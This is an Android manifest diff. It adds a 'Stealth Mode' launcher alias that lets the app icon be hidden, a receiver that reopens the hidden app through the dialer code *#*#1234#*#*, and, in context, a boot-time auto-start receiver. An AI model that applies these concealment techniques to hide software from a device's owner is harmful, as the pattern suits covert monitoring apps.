@@ -63,11 +63,29 @@
         <activity
             android:name=".MainActivity"
             android:exported="true">
+        </activity>
+
+        <!-- Launcher Alias for Stealth Mode (can be dynamically hidden/unhidden) -->
+        <activity-alias
+            android:name=".MainActivityAlias"
+            android:targetActivity=".MainActivity"
+            android:enabled="true"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
+
+        <!-- Secret Code Dialer Receiver to open app when hidden (*#*#1234#*#*) -->
+        <receiver
+            android:name=".SecretCodeReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="1234" />
+            </intent-filter>
+        </receiver>
 
         <!-- Auto-Start Receiver on Phone Reboot -->
         <receiver
